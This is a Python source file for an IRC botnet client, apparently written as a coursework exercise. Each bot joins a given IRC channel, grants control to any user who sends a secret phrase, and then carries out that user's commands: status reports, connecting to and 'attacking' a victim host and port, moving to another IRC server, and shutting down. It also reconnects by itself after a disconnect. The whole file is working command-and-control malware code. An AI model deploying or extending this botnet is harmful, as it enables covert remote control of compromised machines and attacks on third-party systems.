# Authors: Rumen Kasabov, Michael Radke

# Bot program that spawns bots into a specified IRC server + channel. Bots then wait for a secret phrase from a
# controller, authenticate and execute commands specified by that controller in the channel. Otherwise they wait.

import sys
from random import randint
import time
import socket

attack_counter = 1

def attack_victim(host_address, port_num, bot_nick):

    global attack_counter

    victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Try connecting and sending an attack, if successful, no connect or send errors will occur and attack counter
    # counter will increase
    try:
        victim_socket.connect((host_address, int(port_num)))

        victim_socket.send((str(attack_counter) + " " + bot_nick).encode("UTF-8"))

        # Increment if connect and send are successful
        attack_counter += 1

        victim_socket.close()

        return "Attack successful."

    except Exception as e:

        return "Attack failed."


# Send a private message to the controller upon a detected command
def send_message(irc_socket, controller_name, message):

    private_message = "PRIVMSG " + controller_name + " :" + message + "\r\n"
    irc_socket.send(private_message.encode("UTF-8"))


# Generates nicknames for the bots
def nickname_generator():

    main_name = "bot"

    # Generates a random number from 0 to 999999 to be assigned to the bot name
    random_number = randint(0, 999999)

    nickname = main_name + str(random_number)

    return nickname


if __name__ == '__main__':

    # Contains nicknames of authorized controllers
    authorizedController = []

    # Check that correct number of command line arguments have been provided
    if len(sys.argv) != 5:

        print("Wrong number of command line arguments provided\n")

        # If 5 command line arguments not provided, throw usage error
        print("USAGE: python3 bot.py <hostname> <port> <channel> <secret phrase>")

        quit()

    hostname = sys.argv[1]
    port = sys.argv[2]
    channel = sys.argv[3]
    secret_phrase = sys.argv[4]

    irc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Get a random nickname
    nickname = nickname_generator()

    irc_socket.connect((hostname, int(port)))
    print("Connected to the IRC server")

    irc_socket.send(("NICK " + nickname + "\r\n").encode("UTF-8"))

    # Specify username and join the channel
    irc_socket.send(("USER " + nickname + " 0 " + " * " + " :" + "I am " + nickname + "\r\n").encode("UTF-8"))

    irc_socket.send(("JOIN " + channel + "\r\n").encode("UTF-8"))

    # Keep receiving messages from the server in a loop
    while 1:
        try:

            print("RECEIVING IRC MESSAGE")

            # Receive reply from irc server
            message = irc_socket.recv(1024)

            # Decode message
            message = message.decode("UTF-8")

            # If the string is empty it means we received an empty string so the connection is closed. Try reconnecting.
            if not message:

                # Close socket and reconnect
                irc_socket.close()

                irc_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                # Try reconnecting within a 5 second timeout
                time.sleep(5)

                print("Connecting to the IRC server")
                irc_socket.connect((hostname, int(port)))

                irc_socket.send(("NICK " + nickname + "\r\n").encode("UTF-8"))

                # Specify username and join the channel
                irc_socket.send(
                    ("USER " + nickname + " 0 " + " * " + " :" + "I am " + nickname + "\r\n").encode("UTF-8"))
                irc_socket.send(("JOIN " + channel + "\r\n").encode("UTF-8"))

            print("RECEIVED: " + message)


            # If IRC 433 error - nickname in use, we try a different a nickname
            if "433" in message:

                nickname = nickname_generator()

                irc_socket.send(("NICK " + nickname + "\r\n").encode("UTF-8"))

                # Specify username and join the channel
                irc_socket.send(("USER " + nickname + " 0 " + " * " + " :" + "I am " + nickname + "\r\n").encode("UTF-8"))
                irc_socket.send(("JOIN " + channel + "\r\n").encode("UTF-8"))

            elif "PING" in message:

                message = message.split()
                pong_message = "PONG " + message[1]
                irc_socket.send(pong_message.encode("UTF-8"))

            # Get the user sending a secret passphrase through private message
            elif "PRIVMSG" in message:

                message = message.split()

                # Get the name of the sender by splitting the prefix and getting the nickname excluding the
                # rest of the information in the prefix (so nickname after : and before ! in
                # ":examplenick!examplenick.foo.example.com)
                sender_name = (message[0].split("!"))[0][1:]

                sender_channel = message[2]

                # Get the message excluding the colon prefix before it
                sender_message = message[3][1:]

                # Check if the secret is the same and its being sent on the same channel as the bot
                if sender_message == secret_phrase and channel == sender_channel:

                    print("Secret phrase is correct. Controller now authenticated")
                    authorizedController.append(sender_name)

                # If controller command is attack, attack the server indicated
                elif sender_name in authorizedController:

                    if sender_message == "status":

                        # Send the status to the controller
                        send_message(irc_socket, sender_name, "Status: bot is running.")

                    elif "attack" in sender_message:

                        # If host name and port included attack specified server (length of split message will be 6)
                        if len(message) == 6:

                            victim_host = message[4]
                            victim_port = message[5]

                            attack_result = attack_victim(victim_host, victim_port, nickname)

                            # Send result of attack to controller
                            send_message(irc_socket, sender_name, attack_result)

                        else:
                            send_message(irc_socket, sender_name, "No host or port specified for attack to be executed.")

                    elif "move" in sender_message:

                        # Check if host name port and channel provided along with move command
                        # (length of split msg will be 7)
                        if len(message) == 7:

                            move_host = message[4]
                            move_port = message[5]
                            move_channel = message[6]

                            move_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                            # Try connecting to the new host
                            try:
                                move_socket.connect((move_host, int(move_port)))

                                move_socket.send(("NICK " + nickname + "\r\n").encode("UTF-8"))

                                # Specify username and join the channel
                                move_socket.send(
                                    ("USER " + nickname + " 0 " + " * " + " :" + "I am " + nickname + "\r\n").encode(
                                        "UTF-8"))

                                move_socket.send(("JOIN " + move_channel + "\r\n").encode("UTF-8"))

                                send_message(irc_socket, sender_name, "Move to IRC server successful.")

                                # Close old socket
                                irc_socket.close()

                                # Make old socket equal new socket to moved destination
                                irc_socket = move_socket

                                # Change local variables for current bot hostname, port and channel
                                hostname = move_host
                                port = move_port
                                channel = move_channel

                            except Exception as e:

                                send_message(irc_socket, sender_name, "Move to IRC server unsuccessful.")
                        else:
                            send_message(irc_socket, sender_name, "No host, port or "
                                                                  "channel provided for bot to be moved to.")

                    elif sender_message == "shutdown":

                        # Once socket is closed, IRC will inform channel and thus controller of all bots that have
                        # shut down
                        irc_socket.close()
                        break

        # If bot gets disconnected, try reconnecting to the server immediately
        except:

            # Try reconnecting within a 5 second timeout
            time.sleep(5)

            print("Connecting to the IRC server")
            irc_socket.connect((hostname, int(port)))

            irc_socket.send(("NICK " + nickname + "\r\n").encode("UTF-8"))

            # Specify username and join the channel
            irc_socket.send(("USER " + nickname + " 0 " + " * " + " :" + "I am " + nickname + "\r\n").encode("UTF-8"))
            irc_socket.send(("JOIN " + channel + "\r\n").encode("UTF-8"))